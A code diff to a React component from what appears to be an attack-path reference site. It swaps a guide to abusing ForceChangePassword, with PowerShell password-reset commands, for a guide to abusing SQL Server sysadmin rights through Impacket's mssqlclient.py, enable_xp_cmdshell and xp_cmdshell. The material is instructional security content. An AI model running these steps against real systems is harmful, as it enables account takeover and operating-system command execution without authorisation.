@@ -14,7 +14,7 @@ interface IProps {
   title: string;
 }
 
-const ForceChangePassword = ({ title }: IProps) => {
+const SQLAdmin = ({ title }: IProps) => {
   return (
     <>
       {" "}
@@ -36,44 +36,57 @@ const ForceChangePassword = ({ title }: IProps) => {
           >
             <Typography variant="h6">Description</Typography>
             <Typography>
-              The members of the compromised group have the capability to change
-              the user's password in the other group without knowing that user's
-              current password.
+              An account with sysadmin privileges on an SQL Server instance can
+              log into the instance remotely and execute queries against the
+              database. This access can be used to run operating system commands
+              in the context of the SQL Server service account through various
+              methods.
             </Typography>
             <Image
-              src="/ForceChangePassword.png"
-              width={575}
-              height={154}
+              src="/sqladmin.png"
+              height={148}
+              width={441}
               priority={true}
             />
             <Box sx={{ m: 4 }} />
             <Typography variant="h6">Step 1</Typography>
-            <Typography>
-              If you have ForceChangePassword over a group then you can get a
-              list of user's in that group and choose which user we want to
-              change the password for. If you have ForceChangePassword over a
-              user, then skip to step 2.
-            </Typography>
+            <Typography>Get `mssqlclient.py` from Impacket.</Typography>
             <SyntaxHighlighter className="syntax" language="bash">
-              {'Get-ADGroupMember -Identity "OTHER_GROUP_NAME"'}
+              {"pip install impacket"}
             </SyntaxHighlighter>
             <Box sx={{ m: 4 }} />
             <Typography variant="h6">Step 2</Typography>
-            <Typography>Create a new password variable.</Typography>
             <SyntaxHighlighter className="syntax" language="bash">
-              {
-                '$Password = ConvertTo-SecureString "Password123!" -AsPlainText -Force'
-              }
+              {"mssqlclient.py {DOMAIN}/{USER}@{IP} -windows-auth"}
             </SyntaxHighlighter>
             <Box sx={{ m: 4 }} />
             <Typography variant="h6">Step 3</Typography>
             <Typography>
-              Change one of the user's passwords to the password you created.
+              Type `help` to get a list of available options.
+            </Typography>
+            <Image
+              src="/sqladmin2.png"
+              height={213}
+              width={730}
+              priority={true}
+            />
+            <Box sx={{ m: 4 }} />
+            <Typography variant="h6">Step 4</Typography>
+            <Typography>
+              To get command execution, we can use the `enable_xp_cmdshell`
+              command.
             </Typography>
             <SyntaxHighlighter className="syntax" language="bash">
-              {
-                'Set-ADAccountPassword -Identity "ACCOUNT" -Reset -NewPassword $Password'
-              }
+              {"SQL> enable_xp_cmdshell"}
+            </SyntaxHighlighter>
+            <Box sx={{ m: 4 }} />
+            <Typography variant="h6">Step 5</Typography>
+            <Typography>
+              We can now run commands in the format `xp_cmdshell
+              &lt;command&gt;`.
+            </Typography>
+            <SyntaxHighlighter className="syntax" language="bash">
+              {"SQL> xp_cmdshell whoami"}
             </SyntaxHighlighter>
           </Typography>
         </AccordionDetails>
@@ -82,4 +95,4 @@ const ForceChangePassword = ({ title }: IProps) => {
   );
 };
 
-export default ForceChangePassword;
+export default SQLAdmin;
